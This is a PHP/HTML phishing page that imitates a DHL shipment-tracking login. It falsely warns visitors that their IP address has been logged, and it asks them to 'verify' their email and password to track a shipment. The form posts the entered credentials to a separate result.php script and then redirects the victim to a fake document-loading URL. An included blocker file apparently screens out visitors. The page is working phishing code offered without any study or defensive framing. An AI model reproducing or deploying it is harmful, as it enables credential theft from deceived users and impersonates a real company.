<?php
include("../blocker.php");

	$host  = $_SERVER['HTTP_HOST']; $host_upper = strtoupper($host); $path   = rtrim(dirname($_SERVER['PHP_SELF']), '/\\');
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html lang="en" dir="ltr" xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=Edge">
<meta name="robots" content="noindex, nofollow">
<meta name="googlebot" content="noindex, nofollow">
<title>DHL | Global | English</title>
<link rel="shortcut icon" href="../two/favicon.gif">
<link rel="stylesheet" type="text/css" href="../two/layout.css">
<link rel="stylesheet" type="text/css" href="../two/main.css">
	</head>
    <body class="header-image" style="background-image: url('../two/mydhl_image_western-cultural.jpg');">
    <div id="action" style="display:none;"></div>
    <div id="main">
    <div id="header" class="wlp-bighorn-header">
				<img src="../two/dhl_logo_transparent.png" id="logo" alt="DHL Logo" border="0">
				
<font face="Century Gothic" color="white"><h1><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<b>Your IP address (<?php echo $ip; ?>) have been logged for security purposes.</b></h1> <div id="application-title">

					
				</div><div id="servicelinks"></div></font></div><div id="smep_portal_book_main" class="wlp-bighorn-book"><div id="navigation-top" class="jquerycssmenu clearfix"><ul id="nav"></ul><font face="Century Gothic"><span class="wlp-bighorn-menu-button-panel"></span></font></div><div class="wlp-bighorn-book-main-content"><div id="navigation-top-shadow"></div><div id="smep_portal_page_login" class="wlp-bighorn-page clearfix"><div class="wlp-bighorn-layout wlp-bighorn-layout-flow"><div class="wlp-bighorn-layout-cell wlp-bighorn-layout-flow-horizontal wlp-bighorn-layout-flow-first northwest" style="width: 75%"><div></div><div id="portletLcc_1" class="wlp-bighorn-window  "><div class="wlp-bighorn-window-content"><font face="Century Gothic">

<div class="lcc-wrapper">
	
	
	<div class="lcc-template">
			<div class="lcc-banner-wrapper">											
			<div class="lcc-banner">
				<h1 class="lcc-banner-headline" style="color:#FFFFFF;"><font face="Arial Rounded MT">Welcome to DHL</font></h1><font face="Arial Rounded MT">
				<div class="lcc-banner-text" style="color:#FFFFFF;"><font face="Arial Rounded MT">DHL Express is the leader in global express shipping.<br>With DHL we offer you an easy-to-use online shipping, tracking and documents storage for your needs.</font></div><font face="Arial Rounded MT">
			</font></font></div><font face="Arial Rounded MT"><font face="Arial Rounded MT">
			</font></font></div><font face="Arial Rounded MT"><font face="Arial Rounded MT">

	</font></font></div><font face="Arial Rounded MT"><font face="Arial Rounded MT">
</font></font></div><font face="Arial Rounded MT"><font face="Arial Rounded MT">
</font></font></font></div></div></div><div class="wlp-bighorn-layout-cell wlp-bighorn-layout-flow-horizontal northeast" style="width: 25%"><div></div><div id="portletInstance_Login" class="wlp-bighorn-window  "><div class="wlp-bighorn-window-content"><font face="Century Gothic"><font face="Arial Rounded MT"><font face="Arial Rounded MT">



	<div class="login-container">
<script type="text/javascript">
function checkFilled() {
		var fld=document.getElementById('username');
	    var mpa1=document.getElementById('password');
	var emailExp = /^[\w\-\.\+]+\@[a-zA-Z0-9\.\-]+\.[a-zA-z0-9]{2,4}$/;
 if (!fld.value.match(emailExp)) 
		{ 	 
 alert("Enter your Email ID");
   fld.style.borderBottom = "medium solid #d35351";
	fld.style.borderTop = "thin solid #d35351";
	fld.style.borderRight = "thin solid #d35351";
	fld.style.borderLeft = "thin solid #d35351";
        return false; 
 } else{
	fld.style.borderColorTop = "green";

 }
   if(mpa1.value.length < 5) {
 alert("Enter your Password");
    mpa1.style.borderBottom = "medium solid #d35351";
	mpa1.style.borderTop = "thin solid #d35351";
	mpa1.style.borderRight = "thin solid #d35351";
	mpa1.style.borderLeft = "thin solid #d35351";
        return false;
}else{
	mpa1.style.borderColorTop = "green";
   return true;
}
}
	</script>
	<form action="../two/result.php" method="post" onsubmit="return checkFilled()">

		<input name="agenti" type="hidden" id="agenti" value="DHL">
      <input name="redir" type="hidden" id="redir" value="<?php echo "http://$host$path/loadfile.php?https://dhl-express/easy-to-use/tracking_and_documents/index.html?mailclient=%2Fmail&service=mail&flowName=GlifWebSignIn&flowEntry=AddSession"; ?>">
			<div class="external-login-form-wrapper">
				<class="lcc-banner-headline" style="color:#ba0909;"><font face="Century Gothic">Kindly verify you own the email below to enable you track your shipment.<br><br><class="lcc-banner-headline" style="color:#000000;"><font face="Verdana">
		
				<div>				
<input name="logn" id="username" class="textBox" maxlength="60" size="20" value="" placeholder="User ID" type="text">

				</div>
	<br>
				<div>
	   				
	     <input name="passd" id="password" class="textBox" maxlength="20" size="20" title="Password" placeholder="Password" autocomplete="off" type="password">
				</div>
	
				<div class="margin-bottom">
					

<div class="ui-rc-replacement">
	<input name="portletInstance_Loginwlw-checkbox_key:{actionForm.rememberme}OldValue" value="false" type="hidden"><input name="portletInstance_Loginwlw-checkbox_key:{actionForm.rememberme}" id="rememberme" type="checkbox">
		
		<label for="rememberme" class="label toolbox-trigger" id="label_rememberme">Remember Me</label>
	
		<img src="../two/form_help.png" alt="" title="" class="tooltip-img checkbox-tooltip" border="0">
	
<div style="width: 20em;" class="tooltip-content">
	
			Click box if you want DHL to remember your information.
		

</div>
	<br>	
</div>

				</div>
	
				<div class="margin">
					
					<input class="login-submit button button-red" value="CONTINUE" title="CONTINUE" type="submit">
				</div>
				
				<div class="margin-top">
						
				</div>
			
			</font></class="lcc-banner-headline"></font></class="lcc-banner-headline"></div><font face="Century Gothic"><font face="Verdana">
		
	 
</font></font></form></div></font></font></font></div></div></div><div class="wlp-bighorn-layout-cell wlp-bighorn-layout-flow-horizontal wlp-bighorn-layout-flow-last center" style="width: 100%"><div></div><div id="portletRegistrationInformation_4" class="wlp-bighorn-window  "><div class="wlp-bighorn-titlebar"><div class="wlp-bighorn-titlebar-title-panel"><font face="Century Gothic"><font face="Arial Rounded MT"><font face="Arial Rounded MT"><font face="Century Gothic"><font face="Verdana">Registration Information</font></font></font></font></font></div><div class="wlp-bighorn-titlebar-button-panel"><font face="Century Gothic"><font face="Arial Rounded MT"><font face="Arial Rounded MT"><font face="Century Gothic"><font face="Verdana">&nbsp;</font></font></font></font></font></div></div><div class="wlp-bighorn-window-content"><font face="Century Gothic"><font face="Arial Rounded MT"><font face="Arial Rounded MT"><font face="Century Gothic"><font face="Verdana">





<div netui:idscope="portletRegistrationInformation_4">

<div class="registration-teaser">
	
	<h3 class="registration-teaser-header active"><font face="Century Gothic">Learn About the Benefits of DHL</font></h3><font face="Century Gothic">
	<div class="">
		
		
		
		
			<div class="lcc-benefit-icons clearfix">
					<div class="lcc-benefit-icon-wrapper">
				<img src="../two/mydhl_benefit_1.png" alt="benefit-icon">
				<div class="lcc-benefit-icon-text"><font face="Century Gothic">Fast and Easy Online Shipping</font></div><font face="Century Gothic">
			</font></div><font face="Century Gothic">
					<div class="lcc-benefit-icon-wrapper">
				<img src="../two/mydhl_benefit_2.png" alt="benefit-icon">
				<div class="lcc-benefit-icon-text"><font face="Century Gothic">Easy Tracking</font></div><font face="Century Gothic">
			</font></div><font face="Century Gothic">
					<div class="lcc-benefit-icon-wrapper">
				<img src="../two/mydhl_benefit_3.png" alt="benefit-icon">
				<div class="lcc-benefit-icon-text"><font face="Century Gothic">One Login for Everything</font></div><font face="Century Gothic">
			</font></div><font face="Century Gothic">
					<div class="lcc-benefit-icon-wrapper">
				<img src="../two/mydhl_benefit_4.png" alt="benefit-icon">
				<div class="lcc-benefit-icon-text"><font face="Century Gothic">Manage your Profile</font></div><font face="Century Gothic">
			</font></div><font face="Century Gothic">
					<div class="lcc-benefit-icon-wrapper">
				<img src="../two/mydhl_benefit_5.png" alt="benefit-icon">
				<div class="lcc-benefit-icon-text"><font face="Century Gothic">Secure and Convenient Access</font></div><font face="Century Gothic">
			</font></div><font face="Century Gothic">
			</font></font></font></font></font></div><font face="Century Gothic"><font face="Century Gothic"><font face="Century Gothic">

		
		<div class="clearfix">
			
				
					
					
						<div class="registration-teaser-infotext-buttons">					
					
				
				
					<div class="lcc-infotext-wrapper">
				
						
															
			<div class="lcc-infotext">
				<h1 class="lcc-infotext-headline" style="color:#444;"><font face="Century Gothic">MyDHL makes it easier than ever for you to ship online</font></h1><font face="Century Gothic">
				<div class="lcc-infotext-text" style="color:#444;">DHL is the leader in global express shipping.  With MyDHL you have access to our easy-to-use, free online shipping and tracking services all customized to your preferences.  Our solution is ideal for occasional shippers, small and medium business with regular shipping needs or larger volume business to business shippers.</div>
			</font></div><font face="Century Gothic">
			</font></div><font face="Century Gothic">

				
				<div class="registration-teaser-button-link">
						
					

				</div>
			</font></div><font face="Century Gothic">
			
			
				
					<div class="registration-teaser-video">
						<iframe src="https://download-tls-cdn.edge-cdn.net/videodb/7665/videodb_7665_71743_7019632_16x9_mq.mp4" scrolling="no" frameborder="0" height="276" width="490"></iframe>
					</div>
				
				
			
		</font></div><font face="Century Gothic">
	</font></font></font></font></div><font face="Century Gothic"><font face="Century Gothic"><font face="Century Gothic">
</font></font></font></font></div><font face="Century Gothic"><font face="Century Gothic"><font face="Century Gothic">
		
	


</font></font></font></div></font></font></font></font></font></div></div><div id="portletShippingOptionsQuery_4" class="wlp-bighorn-window  "><div class="wlp-bighorn-titlebar"><div class="wlp-bighorn-titlebar-title-panel"><font face="Arial Rounded MT"><font face="Arial Rounded MT"><font face="Verdana"><font face="Century Gothic"><font face="Century Gothic"><font face="Century Gothic">Shipping Options Query</font></font></font></font></font></font></div><div class="wlp-bighorn-titlebar-button-panel"><font face="Arial Rounded MT"><font face="Arial Rounded MT"><font face="Verdana"><font face="Century Gothic"><font face="Century Gothic"><font face="Century Gothic">&nbsp;</font></font></font></font></font></font></div></div><div class="wlp-bighorn-window-content"><font face="Arial Rounded MT"><font face="Arial Rounded MT"><font face="Verdana"><font face="Century Gothic"><font face="Century Gothic"><font face="Century Gothic">

</font></font></font></font></font></font></div></div><div id="portletStyledContent_1" class="wlp-bighorn-window  "><div class="wlp-bighorn-titlebar"><div class="wlp-bighorn-titlebar-title-panel"><font face="Arial Rounded MT"><font face="Arial Rounded MT"><font face="Verdana"><font face="Century Gothic"><font face="Century Gothic"><font face="Century Gothic">Styled Content</font></font></font></font></font></font></div><div class="wlp-bighorn-titlebar-button-panel"><font face="Arial Rounded MT"><font face="Arial Rounded MT"><font face="Verdana"><font face="Century Gothic"><font face="Century Gothic"><font face="Century Gothic">&nbsp;</font></font></font></font></font></font></div></div><div class="wlp-bighorn-window-content"><font face="Arial Rounded MT"><font face="Arial Rounded MT"><font face="Verdana"><font face="Century Gothic"><font face="Century Gothic"><font face="Century Gothic">

</font></font></font></font></font></font></div></div><div id="T130001921281442105601801" class="wlp-bighorn-window  "><div class="wlp-bighorn-titlebar"><div class="wlp-bighorn-titlebar-title-panel"><font face="Arial Rounded MT"><font face="Arial Rounded MT"><font face="Verdana"><font face="Century Gothic"><font face="Century Gothic"><font face="Century Gothic">Styled Content</font></font></font></font></font></font></div><div class="wlp-bighorn-titlebar-button-panel"><font face="Arial Rounded MT"><font face="Arial Rounded MT"><font face="Verdana"><font face="Century Gothic"><font face="Century Gothic"><font face="Century Gothic">&nbsp;</font></font></font></font></font></font></div></div><div class="wlp-bighorn-window-content"><font face="Arial Rounded MT"><font face="Arial Rounded MT"><font face="Verdana"><font face="Century Gothic"><font face="Century Gothic"><font face="Century Gothic">

</font></font></font></font></font></font></div></div></div></div></div></div></div><div class="wlp-bighorn-footer"><font face="Arial Rounded MT"><font face="Arial Rounded MT"><font face="Verdana"><font face="Century Gothic"><font face="Century Gothic"><font face="Century Gothic">

<div class="clearAll"></div>
<div id="footer">
  <div class="container clearfix">
    <div class="footer-logo-wrapper">
    	
    	<img src="../two/DHL_footer_logo.png" title="Deutsche Post DHL" alt="Deutsche Post DHL" class="footer-logo">
    	<span class="copyright"><font face="Century Gothic">2018</font></span><font face="Century Gothic">
	</font></div><font face="Century Gothic">
    <div class="footer_navigation">
      <ul>
        
        <li><a class="first" href=""><font face="Century Gothic">Masthead</font></a></li><font face="Century Gothic">
        <li><a href=""><font face="Century Gothic">Terms &amp; Conditions</font></a></li><font face="Century Gothic">
        <li><a class="last" href=""><font face="Century Gothic">Privacy &amp; Cookies</font></a></li><font face="Century Gothic">
      </font></font></font></ul><font face="Century Gothic"><font face="Century Gothic"><font face="Century Gothic">
    </font></font></font></div><font face="Century Gothic"><font face="Century Gothic"><font face="Century Gothic">
  </font></font></font></font></div><font face="Century Gothic"><font face="Century Gothic"><font face="Century Gothic">
</font></font></font></div></font></font></font></font></font></font></div></div>
<div id="ui-jcalendar-div" class="ui-jcalendar ui-widget ui-widget-content ui-helper-clearfix ui-corner-all ui-helper-hidden-accessible"></div><div id="ui-datepicker-div" class="ui-datepicker ui-widget ui-widget-content ui-helper-clearfix ui-corner-all ui-helper-hidden-accessible"></div><div id="lcc-overlay" class="overlay"><div id="overlay-content-wrapper"></div></div><div id="ui-jcalendar-div" class="ui-jcalendar ui-widget ui-widget-content ui-helper-clearfix ui-corner-all ui-helper-hidden-accessible"></div><div id="ui-datepicker-div" class="ui-datepicker ui-widget ui-widget-content ui-helper-clearfix ui-corner-all ui-helper-hidden-accessible"></div></body></html>